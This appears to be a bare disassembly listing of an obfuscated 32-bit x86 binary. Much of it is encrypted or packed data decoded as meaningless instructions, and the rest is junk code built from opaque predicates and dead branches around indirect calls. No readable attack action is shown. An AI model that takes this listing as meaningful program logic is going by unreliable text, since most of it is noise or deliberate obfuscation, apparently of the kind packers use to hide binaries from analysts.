  4017f2:	sahf   
  4017f3:	fadd   DWORD PTR [esi+0x463b3fc6]
  4017f9:	sbb    eax,0x9308fc50
  4017fe:	xchg   ebx,eax
  4017ff:	adc    eax,0xe36e58f7
  401804:	scas   al,BYTE PTR es:[edi]
  401805:	test   eax,0x7f02d5ee
  40180a:	addr16 sbb eax,0xda3ba0c6
  401810:	add    BYTE PTR [eax-0x2a],dh
  401813:	pop    esi
  401814:	bound  esi,QWORD PTR ds:0x6ec1fcd4
  40181a:	mov    ah,0x4b
  40181c:	inc    esp
  40181d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40181e:	cmp    eax,0xbf96b9b
  401823:	adc    BYTE PTR [esi],dh
  401825:	xor    DWORD PTR [ebp+0x5a146346],ebx
  40182b:	in     al,dx
  40182c:	xor    al,0xfe
  40182e:	fbld   TBYTE PTR [ebx]
  401830:	popf   
  401831:	les    esi,FWORD PTR [edx-0x496d4667]
  401837:	ins    BYTE PTR es:[edi],dx
  401838:	cmp    eax,0x2416e1de
  40183d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40183e:	js     0x4017c2
  401840:	push   edx
  401841:	dec    ebx
  401842:	fwait
  401843:	inc    ebx
  401844:	xchg   esi,eax
  401845:	cmp    al,0x84
  401847:	and    al,0xb6
  401849:	clc    
  40184a:	lods   eax,DWORD PTR ds:[esi]
  40184b:	mov    cl,0xd3
  40184d:	in     eax,0x64
  40184f:	lds    eax,FWORD PTR [ebp+esi*4+0x5b1889db]
  401856:	jns    0x40183d
  401858:	sbb    BYTE PTR [ecx+0x4d93f2e8],al
  40185e:	xor    BYTE PTR [eax],0x34
  401861:	call   0xe76ba695
  401866:	jp     0x401820
  401868:	call   0xef70aacb
  40186d:	std    
  40186e:	pop    eax
  40186f:	add    edx,DWORD PTR [esi]
  401871:	xchg   ebp,eax
  401872:	add    eax,0x14f1f620
  401877:	adc    al,BYTE PTR [ebx-0x533ec4b8]
  40187d:	mov    dl,0x50
  40187f:	add    esp,esp
  401881:	or     eax,0x74bcdc85
  401886:	and    eax,0x4c7e7c19
  40188b:	in     eax,dx
  40188c:	sbb    ecx,DWORD PTR [esi+ebx*4]
  40188f:	adc    ebp,eax
  401891:	cmp    eax,DWORD PTR [ecx]
  401893:	mul    al
  401895:	xchg   ebx,eax
  401896:	rcr    DWORD PTR [edi],0x61
  401899:	push   esp
  40189a:	cmovg  eax,DWORD PTR [eax]
  40189d:	scas   eax,DWORD PTR es:[edi]
  40189e:	xchg   ebp,eax
  40189f:	lock rcr DWORD PTR [edi+0x50d43339],cl
  4018a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018a7:	repnz enter 0x8a07,0xbf
  4018ac:	push   edi
  4018ad:	fild   QWORD PTR [ebx+0x364a4875]
  4018b3:	popa   
  4018b4:	xchg   edx,eax
  4018b5:	bnd ret 0x2b1e
  4018b9:	xor    BYTE PTR [ecx-0x270a3dbe],dh
  4018bf:	fwait
  4018c0:	inc    eax
  4018c1:	pushf  
  4018c2:	call   0xb94:0x8abfb1b5
  4018c9:	xchg   esi,eax
  4018ca:	push   0xffffffe2
  4018cc:	stos   BYTE PTR es:[edi],al
  4018cd:	xchg   esp,eax
  4018ce:	inc    ebx
  4018cf:	xchg   edx,eax
  4018d0:	push   es
  4018d1:	push   esp
  4018d2:	push   edx
  4018d3:	mov    ebx,0xe17cb85
  4018d8:	(bad)  
  4018da:	retf   0xc205
  4018dd:	(bad)  
  4018de:	es js  0x40195a
  4018e1:	push   ss
  4018e2:	pushf  
  4018e3:	mov    eax,ds:0xe6b27f7a
  4018e8:	jns    0x401954
  4018ea:	adc    eax,0x21e5eafc
  4018ef:	jle    0x40187f
  4018f1:	loope  0x401954
  4018f3:	xlat   BYTE PTR ds:[ebx]
  4018f4:	(bad)  
  4018f5:	retf   0x9250
  4018f8:	push   0x6a
  4018fa:	xor    al,0x26
  4018fc:	xchg   edi,eax
  4018fd:	fld    QWORD PTR [esi-0x4b]
  401900:	push   0xc3330716
  401905:	jp     0x401892
  401907:	pusha  
  401908:	aam    0xa5
  40190a:	cmp    eax,0x5681e4e7
  40190f:	mov    BYTE PTR [edx+0x677358d7],ch
  401915:	jmp    0x7dab:0x9af73993
  40191c:	gs hlt 
  40191e:	repz mov edx,0xb6b00772
  401924:	adc    eax,0x87cb2f20
  401929:	inc    ecx
  40192a:	mov    al,0x23
  40192c:	jmp    0x1997f3c7
  401931:	(bad)  
  401932:	pop    ebp
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x4282b7,0x0
  401946:	not    DWORD PTR ds:0x42832f
  40194c:	mov    edi,DWORD PTR ds:0x4281d3
  401952:	mov    DWORD PTR ds:0x4282cf,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x42833b,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x4282b7,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428dbc
  401981:	mov    edx,DWORD PTR ds:0x4283d7
  401987:	adc    DWORD PTR ds:0x42833f,edx
  40198d:	and    edx,DWORD PTR ds:0x42828f
  401993:	add    DWORD PTR ds:0x4282bf,edx
  401999:	mov    edi,DWORD PTR ds:0x4281b3
  40199f:	xor    DWORD PTR ds:0x4281db,edi
  4019a5:	and    DWORD PTR ds:0x4281ab,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x4283bb
  4019b4:	sub    ecx,DWORD PTR ds:0x4282bb
  4019ba:	mov    DWORD PTR ds:0x4283bb,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x4283cb,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x4283c3,0x339b
  4019e6:	mov    eax,ds:0x422410
  4019eb:	cmp    DWORD PTR ds:0x4282a7,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x4282b7
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x4282a7,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x4282c7
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428ea8
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x4281c7
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x4281b7
  401a44:	sub    DWORD PTR ds:0x428343,ecx
  401a4a:	add    DWORD PTR ds:0x4281c3,0x4282bb
  401a54:	xor    edx,DWORD PTR ds:0x42832b
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x4281d3,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x4281d3,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x4282a7
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42835f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x4282ab,0x206f
  401a9e:	cmp    DWORD PTR ds:0x4281d3,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428dc0
  401ac0:	sub    edx,DWORD PTR ds:0x4283e3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x4283cf
  401ad4:	adc    ecx,DWORD PTR ds:0x4281bf
  401ada:	mov    DWORD PTR ds:0x4283cf,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x4281bb
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x4281a3,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x4282b7,0x6ba0
  401b03:	mov    DWORD PTR ds:0x4281cf,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x4281af,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x4281a3,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428f10
  401b3a:	movzx  edx,WORD PTR ds:0x4282df
  401b41:	and    edx,DWORD PTR ds:0x4281bb
  401b47:	mov    DWORD PTR ds:0x4282df,edx
  401b4d:	and    DWORD PTR ds:0x428297,edx
  401b53:	add    DWORD PTR ds:0x4283db,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282e3
  401b5f:	add    DWORD PTR ds:0x42829b,edi
  401b65:	or     edx,DWORD PTR ds:0x4283c7
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42834b,0x0
  401b78:	mov    DWORD PTR ds:0x4282e3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x4281b3,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428287
  401ba1:	cmp    DWORD PTR ds:0x42834b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428dd4
  401bc7:	sub    DWORD PTR ds:0x428337,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42829b
  401bd4:	add    DWORD PTR ds:0x428347,edx
  401bda:	add    DWORD PTR ds:0x42819f,ebx
  401be0:	sbb    DWORD PTR ds:0x42826f,edi
  401be6:	inc    DWORD PTR ds:0x42826f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x4283d3,0x428277
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xe4b0afeb
  401c11:	mov    eax,0xa25beee
  401c16:	sbb    BYTE PTR [eax],bl
  401c18:	sahf   
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    BYTE PTR [eax-0x7b07869f],dl
  401c21:	sbb    ebx,DWORD PTR [esi+eax*1+0x79]
  401c25:	stos   BYTE PTR es:[edi],al
  401c26:	dec    ecx
  401c27:	mov    ch,0x7d
  401c29:	jmp    0xe332:0x42eb70a3
  401c30:	jno    0x401c6a
  401c32:	jle    0x401c5f
  401c34:	push   edx
  401c35:	fstp   TBYTE PTR [eax-0x401b741a]
  401c3b:	lods   eax,DWORD PTR ds:[esi]
  401c3c:	in     eax,0x3a
  401c3e:	popa   
  401c3f:	xor    al,0x9
  401c41:	dec    edi
  401c42:	mov    edx,0x1f29b8b7
  401c47:	sub    bl,BYTE PTR [ecx+0x5e]
  401c4a:	and    DWORD PTR [ebx+ecx*4-0x5400df19],ebp
  401c51:	and    DWORD PTR [ebx],ebp
  401c53:	(bad)  
  401c54:	loope  0x401c2c
  401c56:	mov    esi,0xacb535e3
  401c5b:	lea    edx,[edi+0x30]
  401c5e:	lods   eax,DWORD PTR ds:[esi]
  401c5f:	mov    ds:0xe1a287e6,al
  401c64:	sbb    dh,ch
  401c66:	push   eax
  401c67:	inc    ebx
  401c68:	pop    ds
  401c69:	and    BYTE PTR [esi],dl
  401c6b:	add    DWORD PTR [ebp+0x22],edi
  401c6e:	mov    ch,BYTE PTR [edi-0x53a5a76d]
  401c74:	mov    DWORD PTR [esi-0x39181231],edi
  401c7a:	dec    ebp
  401c7b:	std    
  401c7c:	out    dx,eax
  401c7d:	mov    ah,0x5a
  401c7f:	in     al,dx
  401c80:	jno    0x401c18
  401c82:	das    
  401c83:	sar    DWORD PTR [esi+0x28],0x75
  401c87:	scas   al,BYTE PTR es:[edi]
  401c88:	push   ebx
  401c89:	les    edi,FWORD PTR [ebx-0x4e1cf327]
  401c8f:	ficom  WORD PTR [ecx+0x223371c9]
  401c95:	stc    
  401c96:	pop    ss
  401c97:	out    0xd3,eax
  401c99:	mov    esi,0x23b00743
  401c9e:	xchg   dh,ch
  401ca0:	loope  0x401c55
  401ca2:	mov    dl,BYTE PTR [esi+0x3b]
  401ca5:	fs inc esp
  401ca7:	cmp    eax,0xc9fba728
  401cac:	xchg   DWORD PTR [eax],ebp
  401cae:	pushf  
  401caf:	sbb    eax,0x155885b2
  401cb4:	xchg   ah,dh
  401cb6:	cmp    dl,bh
  401cb8:	repnz sbb ebx,DWORD PTR [eax+0x69]
  401cbc:	lea    ebx,[esi]
  401cbe:	std    
  401cbf:	fidivr DWORD PTR [edi]
  401cc1:	pusha  
  401cc2:	loope  0x401d31
  401cc4:	scas   eax,DWORD PTR es:[edi]
  401cc5:	sbb    BYTE PTR [esi+0x3f],0x20
  401cc9:	(bad)  
  401ccb:	cmp    al,0x48
  401ccd:	sbb    eax,0xd1e8d5b4
  401cd2:	sub    edi,DWORD PTR [edi]
  401cd4:	(bad)  
  401cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd6:	js     0x401c63
  401cd8:	pop    es
  401cd9:	out    dx,eax
  401cda:	scas   al,BYTE PTR es:[edi]
  401cdb:	mov    al,ds:0x72b6ccd2
  401ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ce1:	(bad)  
  401ce3:	and    DWORD PTR [edi-0x1d],0x273ff6c6
  401cea:	push   ds
  401ceb:	mov    ah,0xd7
  401ced:	inc    esp
  401cee:	jno    0x401d68
  401cf0:	dec    esp
  401cf1:	ja     0x401cee
  401cf3:	repz rcr DWORD PTR [esi+0x5fd2ddcc],cl
  401cfa:	ja     0x401cb3
  401cfc:	mov    dl,BYTE PTR [edx]
  401cfe:	dec    esi
  401cff:	test   DWORD PTR [ebx-0x24ce909b],ecx
  401d05:	jb     0x401d32
  401d07:	mov    eax,0x7abd174c
  401d0c:	scas   eax,DWORD PTR es:[edi]
  401d0d:	into   
  401d0e:	mov    edi,0x62fee310
  401d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d14:	jmp    0x4afd:0x1d691bb3
  401d1b:	xlat   BYTE PTR ds:[ebx]
  401d1c:	jle    0x401d9c
  401d1e:	mov    esi,0x74cafc7c
  401d23:	rol    DWORD PTR ds:0xe0847143,0xeb
  401d2a:	pop    edx
  401d2b:	cwde   
  401d2c:	jae    0x401d43
  401d2e:	imul   esi,DWORD PTR [ebp+0x61216d0],0xccc833d2
  401d38:	jecxz  0x401d1c
  401d3a:	jno    0x401da7
  401d3c:	and    cl,dh
  401d3e:	(bad)  
  401d3f:	jecxz  0x401d47
  401d41:	add    DWORD PTR [ebx+ebp*2-0x771fe2df],esp
  401d48:	sub    DWORD PTR [ebx],0xffffffc4
  401d4b:	inc    esp
  401d4c:	or     cl,BYTE PTR [esp+ecx*2-0x45f095de]
  401d53:	das    
  401d54:	adc    cl,BYTE PTR ds:0xa53e50c0
  401d5a:	sbb    BYTE PTR [ebp+0x314cd2e],al
  401d60:	out    dx,eax
  401d61:	fdivr  DWORD PTR [edi+0x2ec2c337]
  401d67:	pop    ebx
  401d68:	xchg   ebx,eax
  401d69:	je     0x401d74
  401d6b:	xchg   DWORD PTR ds:[ecx+0x61ac7cf9],ebx
  401d72:	sub    BYTE PTR [ecx+0x1591f991],ah
  401d78:	sub    BYTE PTR [esi+0x33c24f02],ah
  401d7e:	add    al,0xce
  401d80:	xor    bl,BYTE PTR [edx-0x4ae76d6e]
  401d86:	in     al,dx
  401d87:	jne    0x401d56
  401d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8a:	loope  0x401dca
  401d8c:	or     BYTE PTR [edx+eiz*2],ah
  401d8f:	or     al,dh
  401d91:	pusha  
  401d92:	bound  eax,QWORD PTR [esi]
  401d94:	mov    bh,0x48
  401d96:	lods   eax,DWORD PTR ds:[esi]
  401d97:	or     BYTE PTR [eax-0x3b],0x7e
  401d9b:	push   ebx
  401d9c:	or     BYTE PTR [edx+0x74890ce],dh
  401da2:	std    
  401da3:	jns    0x401d85
  401da5:	mov    ch,0x2a
  401da7:	dec    ebx
  401da8:	repz add cl,al
  401dab:	push   0x69422157
  401db0:	ins    DWORD PTR es:[edi],dx
  401db1:	les    ebx,FWORD PTR [edx-0x10]
  401db4:	inc    edx
  401db5:	lods   eax,DWORD PTR ds:[esi]
  401db6:	mov    BYTE PTR [ebx-0x73],ch
  401db9:	(bad)  
  401dba:	int3   
  401dbb:	aas    
  401dbc:	mov    bh,0xa7
  401dbe:	cld    
  401dbf:	call   0x4e12:0x32d2b980
  401dc6:	ror    bh,cl
  401dc8:	in     al,dx
  401dc9:	or     ch,BYTE PTR [eax]
  401dcb:	neg    bh
  401dcd:	xor    eax,0xe44d7ed0
  401dd2:	enter  0x5227,0xca
  401dd6:	mov    esi,0xe17e9115
  401ddb:	xchg   ebp,eax
  401ddc:	adc    cl,BYTE PTR [ebx]
  401dde:	sub    BYTE PTR [edx+0x79],dl
  401de1:	jge    0x401e58
  401de3:	mov    dh,0xc
  401de5:	cli    
  401de6:	fwait
  401de7:	pop    ecx
  401de8:	int    0x0
  401dea:	jge    0x401e41
  401dec:	sub    eax,DWORD PTR [edi+0x1d2e4bd]
  401df2:	iret   
  401df3:	sub    DWORD PTR [edx+0x16],0x5b
  401df7:	(bad)  
  401df8:	jmp    0x1a15bdb3
  401dfd:	mov    ebp,edi
  401dff:	jne    0x401dd7
  401e01:	pop    ebx
  401e02:	or     ebx,esi
  401e04:	mov    dh,bh
  401e06:	jnp    0x401d9c
  401e08:	shl    dl,1
  401e0a:	fdiv   DWORD PTR [edx-0x7a]
  401e0d:	jmp    0xfd32:0xfc1c9b0f
  401e14:	cmp    eax,0x32f8d600
  401e19:	int3   
  401e1a:	(bad)  
  401e1b:	scas   eax,DWORD PTR es:[edi]
  401e1c:	add    al,0xb7
  401e1e:	mov    ecx,esp
  401e20:	fcomp  DWORD PTR [edi+ebp*8-0x1efb3da7]
  401e27:	bound  esp,QWORD PTR [edx+0x5517d480]
  401e2d:	fcomp  DWORD PTR [edi-0x19]
  401e30:	or     dh,BYTE PTR [ebx+0x60]
  401e33:	xor    BYTE PTR [ebx+edi*2+0x66],ch
  401e37:	xchg   ecx,eax
  401e38:	or     bl,bl
  401e3a:	out    0x88,eax
  401e3c:	dec    ecx
  401e3d:	stos   BYTE PTR es:[edi],al
  401e3e:	sahf   
  401e3f:	mov    ebx,0xfcb0f067
  401e44:	cdq    
  401e45:	aaa    
  401e46:	jle    0x401ea7
  401e48:	(bad)  
  401e4a:	stos   DWORD PTR es:[edi],eax
  401e4b:	pop    esi
  401e4c:	adc    BYTE PTR [ebp+0x39],0x71
  401e50:	jp     0x401e29
  401e52:	out    0x3b,eax
  401e54:	push   eax
  401e55:	(bad)  
  401e56:	push   0x61
  401e58:	neg    DWORD PTR [esi+0x3fbcbd80]
  401e5e:	xor    eax,0xffffffd3
  401e61:	dec    edx
  401e62:	jl     0x401eaa
  401e64:	mov    al,ds:0x2f22f3c3
  401e69:	lods   eax,DWORD PTR ds:[esi]
  401e6a:	xchg   dl,bl
  401e6c:	sub    eax,0x1deaeb25
  401e71:	pop    esp
  401e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e73:	push   ss
  401e74:	cmc    
  401e75:	cmp    ecx,DWORD PTR [eax+edi*2-0x3f]
  401e79:	mov    edi,esp
  401e7b:	pop    ds
  401e7c:	call   0xdd6b80f4
  401e81:	jae    0x401e7d
  401e83:	arpl   WORD PTR [eax+0x7e],ax
  401e86:	mov    ds:0x4becb51,eax
  401e8b:	pop    esi
  401e8c:	mov    ah,0x65
  401e8e:	add    al,0x7a
  401e90:	test   DWORD PTR [edi],0x36b6dea7
  401e96:	arpl   WORD PTR ds:0x8f55940,si
  401e9c:	out    dx,eax
  401e9d:	cmp    ebp,edi
  401e9f:	inc    edx
  401ea0:	cmp    eax,0x6460dfd2
  401ea5:	dec    edx
  401ea6:	outs   dx,DWORD PTR ds:[esi]
  401ea7:	out    0xf7,al
  401ea9:	ins    BYTE PTR es:[edi],dx
  401eaa:	push   edx
  401eab:	mov    ah,0xbf
  401ead:	and    BYTE PTR [edi+0x11265036],0xbd
  401eb4:	std    
  401eb5:	inc    edx
  401eb6:	mov    BYTE PTR [ebx+ebp*2-0x2b],0xc0
  401ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ebc:	sbb    BYTE PTR [ebp+0xc],bl
  401ebf:	iret   
  401ec0:	dec    edx
  401ec1:	sub    esp,0xae2bced8
  401ec7:	retf   0x1e07
  401eca:	enter  0x6684,0xbd
  401ece:	shl    BYTE PTR [ecx],1
  401ed0:	or     BYTE PTR [edx+eiz*8],bh
  401ed3:	mov    al,ds:0x12dd48ab
  401ed8:	fst    DWORD PTR ss:[ebp+0x154a6abd]
  401edf:	adc    dh,BYTE PTR [edx+0x33]
  401ee2:	add    DWORD PTR [edi],edi
  401ee4:	or     al,0xc0
  401ee6:	push   es
  401ee7:	dec    ecx
  401ee8:	dec    edx
  401ee9:	and    al,0x4d
  401eeb:	pop    es
  401eec:	test   DWORD PTR [ebx+ebp*1+0x4611d3c8],ebx
  401ef3:	arpl   WORD PTR [edi-0x24],bx
  401ef6:	dec    ebp
  401ef7:	cmp    BYTE PTR [edi+0x24d3e5c3],ch
  401efd:	stos   BYTE PTR es:[edi],al
  401efe:	addr16 ja 0x401f1e
  401f01:	test   bh,ch
  401f03:	jbe    0x401f70
  401f05:	sub    BYTE PTR [ebx+eax*2+0x408823b5],0xd1
  401f0d:	(bad)  
  401f0f:	fist   WORD PTR [edx-0x4a]
  401f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f13:	adc    cl,BYTE PTR [esi]
  401f15:	ja     0x401ed6
  401f17:	ins    DWORD PTR es:[edi],dx
  401f18:	je     0x401eda
  401f1a:	xchg   esp,eax
  401f1b:	lods   eax,DWORD PTR ds:[esi]
  401f1c:	(bad)  
  401f1d:	in     eax,0xa8
  401f1f:	pop    eax
  401f20:	mov    ds:0x1c041372,eax
  401f25:	push   ebx
  401f26:	jmp    0xe261f518
  401f2b:	mov    al,0x2
  401f2d:	jp     0x401edc
  401f2f:	out    dx,al
  401f30:	adc    al,0xdb
  401f32:	cwde   
  401f33:	sbb    DWORD PTR [ecx-0x35937b72],ecx
  401f39:	and    BYTE PTR [eax+0x19205860],bl
  401f3f:	fst    QWORD PTR [eax-0x13]
  401f42:	sub    ah,BYTE PTR ds:0x3291a0f6
  401f48:	out    dx,al
  401f49:	sub    al,0x43
  401f4b:	inc    edx
  401f4c:	shl    DWORD PTR ds:0x854bf8c7,0xe8
  401f53:	sbb    al,0xa1
  401f55:	(bad)  
  401f56:	mov    ds:0x2272496c,eax
  401f5b:	mov    edi,0x2ada081c
  401f60:	(bad)  
  401f62:	mov    ebp,0x33b6437e
  401f67:	mov    eax,0x90a1457f
  401f6c:	mov    ch,0x99
  401f6e:	pop    edi
  401f6f:	scas   eax,DWORD PTR es:[edi]
  401f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f71:	add    ch,BYTE PTR [edi+0xf]
  401f74:	sub    esi,DWORD PTR [esi+edi*2-0x51]
  401f78:	and    ecx,DWORD PTR [ebp+0x3d]
  401f7b:	dec    esi
  401f7c:	fimul  WORD PTR [esi+0x19]
  401f7f:	push   esi
  401f80:	mov    cl,0xc4
  401f82:	jmp    0x401f6b
  401f84:	mov    esp,0x65a584a0
  401f89:	dec    ecx
  401f8a:	and    al,0xcc
  401f8c:	cs call esi
  401f8f:	sbb    DWORD PTR [edi],ebp
  401f91:	inc    eax
  401f92:	and    al,0x92
  401f94:	jae    0x401fae
  401f96:	test   eax,0xafc5b43f
  401f9b:	ret    
  401f9c:	scas   al,BYTE PTR es:[edi]
  401f9d:	or     esp,DWORD PTR [edx-0x1a]
  401fa0:	push   edi
  401fa1:	fadd   QWORD PTR [esi+0x2edfca1b]
  401fa7:	icebp  
  401fa8:	adc    BYTE PTR [esi+edx*2-0x44b0b497],ch
  401faf:	out    dx,eax
  401fb0:	xchg   esp,eax
  401fb1:	daa    
  401fb2:	or     ebx,DWORD PTR [esi-0x23759f27]
  401fb8:	int    0x13
  401fba:	mov    ah,BYTE PTR [edx+0x59c796e3]
  401fc0:	dec    edi
  401fc1:	add    ecx,DWORD PTR [ebx]
  401fc3:	mov    edx,0x2792867e
  401fc8:	stc    
  401fc9:	push   es
  401fca:	jp     0x401ffb
  401fcc:	inc    eax
  401fcd:	fdiv   QWORD PTR [edx-0x48]
  401fd0:	leave  
  401fd1:	int3   
  401fd2:	xchg   esp,eax
  401fd3:	dec    ebp
  401fd4:	xor    eax,0xcfa7d934
  401fd9:	cmc    
  401fda:	outs   dx,DWORD PTR ds:[esi]
  401fdb:	cmp    DWORD PTR [ebx],ebx
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x4283ab
  401fec:	adc    DWORD PTR ds:0x4283e7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x4283cb,0x0
  402000:	mov    DWORD PTR ds:0x4282cb,0x4df8
  40200a:	mov    DWORD PTR ds:0x4283b3,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x4283cb,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428dd8
  40203e:	or     DWORD PTR ds:0x4281af,0x6f29
  402048:	xor    DWORD PTR ds:0x42834b,0x42833f
  402052:	add    DWORD PTR ds:0x4282cb,0x428367
  40205c:	and    DWORD PTR ds:0x4283db,edi
  402062:	mov    DWORD PTR ds:0x4282bb,0x2a04
  40206c:	sub    DWORD PTR ds:0x4281db,0x42819b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x42832f,0x0
  402084:	mov    DWORD PTR ds:0x42832b,ecx
  40208a:	mov    DWORD PTR ds:0x4281d7,0x59f
  402094:	mov    DWORD PTR ds:0x4281d7,ecx
  40209a:	mov    DWORD PTR ds:0x428357,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x42832f,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x4281ab
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428f14
  4020ce:	sbb    DWORD PTR ds:0x4283bb,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x42833b,0x4282af
  4020e2:	adc    DWORD PTR ds:0x4283af,0x4c73
  4020ec:	add    DWORD PTR ds:0x4283af,0x4283df
  4020f6:	and    DWORD PTR ds:0x428197,0x4283b3
  402100:	sbb    DWORD PTR ds:0x42819b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x42832f,0x4282df
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x42832b
  40213c:	add    DWORD PTR ds:0x4282c7,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x4283bb
  40214e:	add    DWORD PTR ds:0x428357,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x4281a7,0x0
  402162:	mov    DWORD PTR ds:0x4283cb,0x750f
  40216c:	not    DWORD PTR ds:0x4283b3
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x4282ab,0x610f
  402181:	mov    eax,ds:0x4281bf
  402186:	cmp    DWORD PTR ds:0x4281a7,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x4280a9
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428eb0
  4021b1:	adc    DWORD PTR ds:0x4282cf,0x4282a3
